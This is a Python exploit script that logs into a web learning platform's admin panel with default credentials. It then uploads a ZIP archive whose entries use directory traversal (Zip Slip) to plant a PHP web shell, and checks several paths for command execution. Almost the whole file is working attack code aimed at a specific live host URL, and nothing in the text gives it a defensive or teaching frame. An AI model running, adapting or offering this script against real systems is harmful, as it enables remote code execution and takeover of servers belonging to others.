import requests
import zipfile
import io
import re
import os
import random
import string
import base64
import time

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        return "/admin" in r.url or "/panel" in r.url
    except: return False

def get_csrf(url):
    r = session.get(url)
    match = re.search(r'name="csrf-token" content="([^"]+)"', r.text)
    if not match: match = re.search(r'name="_token" value="([^"]+)"', r.text)
    return match.group(1) if match else None

def main():
    if not login(): return

    # Scrape webinar
    r = session.get(f"{BASE_URL}/admin/webinars")
    web_id = re.search(r'/admin/webinars/(\d+)/edit', r.text).group(1)
    r = session.get(f"{BASE_URL}/admin/webinars/{web_id}/edit")
    chap_id = re.search(r'chapter_id":(\d+)', r.text).group(1) if re.search(r'chapter_id":(\d+)', r.text) else "30"
    
    # Payload
    shell = "<?php system($_GET['c']); ?>"
    rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    zip_filename = f"{rand_name}.zip"
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        # 6 levels to reach public/
        z.writestr('../../../../../../s1.php', shell)
        # 6 levels + assets/
        z.writestr('../../../../../../assets/s2.php', shell)
        # 7 levels just in case
        z.writestr('../../../../../../../s3.php', shell)
        
    buf.seek(0)
    
    # Trigger
    csrf = get_csrf(f"{BASE_URL}/panel/courses/{web_id}/edit")
    payload = {
        'ajax[new][webinar_id]': web_id, 'ajax[new][chapter_id]': chap_id,
        'ajax[new][title]': 'Deep Slip ' + rand_name, 'ajax[new][accessibility]': 'free',
        'ajax[new][storage]': 'upload_archive', 'ajax[new][interactive_type]': 'custom',
        'ajax[new][interactive_file_name]': 's1.php', 'ajax[new][status]': 'on',
        '_token': csrf
    }
    files = {'ajax[new][file_upload]': (zip_filename, buf, 'application/zip')}
    
    print(f"[*] Triggering multi-level Zip Slip ({zip_filename})...")
    r = session.post(f"{BASE_URL}/panel/files/store", data=payload, files=files)
    print(f"[*] Response: {r.status_code}")
    
    # Verify
    time.sleep(2)
    checks = ["/s1.php", "/assets/s2.php", "/s3.php", "/assets/s1.php"]
    for p in checks:
        url = f"{BASE_URL}{p}"
        print(f"[*] Checking {url}...")
        res = session.get(url + "?c=id")
        if res.status_code == 200 and "uid=" in res.text:
            print(f"[!!!!] SUCCESS! Shell at {url}")
            print(f"Output: {res.text.strip()}")
            return
    print("[-] No shell found at root or assets.")

if __name__ == "__main__":
    main()
